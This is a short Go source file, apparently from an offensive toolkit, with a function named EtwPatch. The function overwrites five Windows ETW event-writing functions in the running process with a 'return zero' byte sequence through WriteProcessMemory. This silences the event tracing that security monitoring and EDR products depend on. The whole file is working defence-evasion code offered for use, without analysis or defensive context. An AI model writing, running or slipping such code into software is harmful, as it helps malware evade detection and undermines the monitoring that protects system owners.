package hook

import (
	"encoding/hex"
	"unsafe"
	"variant/wdll"
)

func EtwPatch() error {
	dataAddr := []uintptr{
		wdll.EtwEventWriteFull().Addr(),
		wdll.EtwEventWrite().Addr(),
		wdll.EtwEventWriteEx().Addr(),
		wdll.EtwEventWriteString().Addr(),
		wdll.EtwEventWriteTransfer().Addr(),
	}

	for i := range dataAddr {
		data, _ := hex.DecodeString("4833C0C3")
		wdll.WriteProcessMemory().Call(
			uintptr(0xffffffffffffffff),
			dataAddr[i],
			uintptr(unsafe.Pointer(&data[0])),
			uintptr(len(data)),
			0,
		)
	}

	return nil
}
